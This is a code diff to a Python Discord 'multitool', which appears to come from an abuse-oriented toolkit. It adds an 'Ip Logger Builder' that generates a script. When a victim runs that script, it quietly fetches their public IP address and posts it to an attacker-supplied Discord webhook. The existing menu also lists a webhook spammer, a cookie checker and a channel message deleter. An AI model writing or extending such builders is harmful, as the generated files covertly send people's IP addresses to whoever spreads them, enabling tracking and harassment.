@@ -969,21 +969,34 @@ def mass_deleter():
 	print("Done")
 	input("")
 	return
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+#____
+def ip_logger_builder():
+	name = input("Enter File Name: ")
+	while True:
+	    try:
+	        webhook = input("Enter Webhook: ")
+	        r = requests.get(webhook)
+	        if "200" in str(r):
+	            break
+	        if "200" not in str(r):
+	            print("Webhook Invalid")
+	    except Exception:
+	        print("Webhook Invalid")
+	file = open(f"{name}.py", "a")
+	file.write("import requests\n")
+	file.write('print("Loading")\n')
+	file.write(f'webhook = "{webhook}"\n')
+	file.write('url = "https://api.ipify.org"\n')
+	file.write("r = requests.get(url).text\n")
+	file.write("r = str(r)\n")
+	file.write('requests.post(webhook, json={"content": f"@everyone ```Ip: {r}```"})\n')
+	file.write('print("Done")\n')
+	file.write('input("")\n')
+	file.write('exit()\n')
+	file.close()
+	input("")
+	exit()
+	
 
 
 
@@ -1270,9 +1283,13 @@ if logined == True or dev_mode == True:
 			time.sleep(delay)
 			print(colorama.Fore.RED + "		|------------------------------------|")
 			time.sleep(delay)
-			print(colorama.Fore.YELLOW + "		|21. Discord Channel Message Deleter |")
+			print(colorama.Fore.YELLOW + "		|22. Discord Channel Message Deleter |")
 			time.sleep(delay)
 			print(colorama.Fore.GREEN + "		|------------------------------------|")
+			time.sleep(delay)
+			print(colorama.Fore.BLUE + "		|23. Ip Logger Builder               |")
+			time.sleep(delay)
+			print(colorama.Fore.CYAN + "		|------------------------------------|")
 #__________________
 		if blank == True:
 			print("		██████╗░██╗░░░░░░█████╗░██████╗░░██████╗  ███╗░░░███╗██╗░░░██╗██╗░░░░░████████╗██╗████████╗░█████╗░░█████╗░██╗░░░░░")
@@ -1378,6 +1395,10 @@ if logined == True or dev_mode == True:
 			print("		|22. Discord Channel Message Deleter |")
 			time.sleep(delay)
 			print("		|------------------------------------|")
+			time.sleep(delay)
+			print("		|23. Ip Logger Builder               |")
+			time.sleep(delay)
+			print("		|------------------------------------|")
 #________________
 		if red == True:
 			print(colorama.Fore.RED + "		██████╗░██╗░░░░░░█████╗░██████╗░░██████╗  ███╗░░░███╗██╗░░░██╗██╗░░░░░████████╗██╗████████╗░█████╗░░█████╗░██╗░░░░░")
@@ -1480,7 +1501,11 @@ if logined == True or dev_mode == True:
 			time.sleep(delay)
 			print(colorama.Fore.RED + "		|------------------------------------|")
 			time.sleep(delay)
-			print(colorama.Fore.RED + "		|21. Discord Channel Message Deleter |")
+			print(colorama.Fore.RED + "		|22. Discord Channel Message Deleter |")
+			time.sleep(delay)
+			print(colorama.Fore.RED + "		|------------------------------------|")
+			time.sleep(delay)
+			print(colorama.Fore.RED + "		|23. Ip Logger Builder               |")
 			time.sleep(delay)
 			print(colorama.Fore.RED + "		|------------------------------------|")
 #________________
@@ -1585,7 +1610,11 @@ if logined == True or dev_mode == True:
 			time.sleep(delay)
 			print(colorama.Fore.BLUE + "		|------------------------------------|")
 			time.sleep(delay)
-			print(colorama.Fore.BLUE + "		|21. Discord Channel Message Deleter |")
+			print(colorama.Fore.BLUE + "		|22. Discord Channel Message Deleter |")
+			time.sleep(delay)
+			print(colorama.Fore.BLUE + "		|------------------------------------|")
+			time.sleep(delay)
+			print(colorama.Fore.BLUE + "		|23. Ip Logger Builder               |")
 			time.sleep(delay)
 			print(colorama.Fore.BLUE + "		|------------------------------------|")
 #________________
@@ -1690,7 +1719,11 @@ if logined == True or dev_mode == True:
 			time.sleep(delay)
 			print(colorama.Fore.GREEN + "		|------------------------------------|")
 			time.sleep(delay)
-			print(colorama.Fore.GREEN + "		|21. Discord Channel Message Deleter |")
+			print(colorama.Fore.GREEN + "		|22. Discord Channel Message Deleter |")
+			time.sleep(delay)
+			print(colorama.Fore.GREEN + "		|------------------------------------|")
+			time.sleep(delay)
+			print(colorama.Fore.GREEN + "		|23. Ip Logger Builder               |")
 			time.sleep(delay)
 			print(colorama.Fore.GREEN + "		|------------------------------------|")
 #________________
@@ -1795,7 +1828,11 @@ if logined == True or dev_mode == True:
 			time.sleep(delay)
 			print(colorama.Fore.MAGENTA + "		|------------------------------------|")
 			time.sleep(delay)
-			print(colorama.Fore.MAGENTA + "		|21. Discord Channel Message Deleter |")
+			print(colorama.Fore.MAGENTA + "		|22. Discord Channel Message Deleter |")
+			time.sleep(delay)
+			print(colorama.Fore.MAGENTA + "		|------------------------------------|")
+			time.sleep(delay)
+			print(colorama.Fore.MAGENTA + "		|23. Ip Logger Builder               |")
 			time.sleep(delay)
 			print(colorama.Fore.MAGENTA + "		|------------------------------------|")
 #________________
@@ -1900,7 +1937,11 @@ if logined == True or dev_mode == True:
 			time.sleep(delay)
 			print(colorama.Fore.YELLOW + "		|------------------------------------|")
 			time.sleep(delay)
-			print(colorama.Fore.YELLOW + "		|21. Discord Channel Message Deleter |")
+			print(colorama.Fore.YELLOW + "		|22. Discord Channel Message Deleter |")
+			time.sleep(delay)
+			print(colorama.Fore.YELLOW + "		|------------------------------------|")
+			time.sleep(delay)
+			print(colorama.Fore.YELLOW + "		|23. Ip Logger Builder               |")
 			time.sleep(delay)
 			print(colorama.Fore.YELLOW + "		|------------------------------------|")
 #________________
@@ -2005,7 +2046,11 @@ if logined == True or dev_mode == True:
 			time.sleep(delay)
 			print(colorama.Fore.CYAN + "		|------------------------------------|")
 			time.sleep(delay)
-			print(colorama.Fore.CYAN + "		|21. Discord Channel Message Deleter |")
+			print(colorama.Fore.CYAN + "		|22. Discord Channel Message Deleter |")
+			time.sleep(delay)
+			print(colorama.Fore.CYAN + "		|------------------------------------|")
+			time.sleep(delay)
+			print(colorama.Fore.CYAN + "		|23. Ip Logger Builder               |")
 			time.sleep(delay)
 			print(colorama.Fore.CYAN + "		|------------------------------------|")
 #________________
@@ -2093,6 +2138,9 @@ if logined == True or dev_mode == True:
 		if really_main == "i22" or really_main == "I22" or really_main == "I 22" or really_main == "i 22":
 			print("It Will Delete All Messages In An Channel (NOT DMS)")
 			input("")
+		if really_main == "i23" or really_main == "I23" or really_main == "I 23" or really_main == "i 23":
+			print("It Will Create An Ip Logger Connected To Your Webhook")
+			input("")
 		if really_main == "1":
 			webhook_spammer()
 		if really_main == "3":
@@ -2101,6 +2149,8 @@ if logined == True or dev_mode == True:
 			webhook_checker()
 		if really_main == "12":
 			cookie_checker()
+		if really_main == "23":
+			ip_logger_builder()
 		if really_main == "4":
 			private_screenshot_gen()
 		if really_main == "2":
